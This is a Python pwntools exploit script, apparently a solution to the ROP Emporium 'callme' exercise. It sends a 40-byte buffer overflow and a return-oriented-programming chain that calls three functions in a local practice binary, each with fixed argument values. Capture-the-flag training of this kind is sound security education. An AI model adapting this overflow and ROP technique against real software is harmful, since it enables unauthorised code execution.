from pwn import *
elf = context.binary = ELF("./callme")
io = process("./callme")

pop_gadget=0x0040093c
def call(addr):
    payload=p64(pop_gadget)
    payload+=p64(0xdeadbeefdeadbeef)
    payload+=p64(0xcafebabecafebabe)
    payload+=p64(0xd00df00dd00df00d)
    payload+=p64(addr)
    return payload

io.recv()
payload=b"A"*40
payload+=call(elf.sym['callme_one'])
payload+=call(elf.sym['callme_two'])
payload+=call(elf.sym['callme_three'])

print(payload)
io.sendline(payload)
io.interactive()
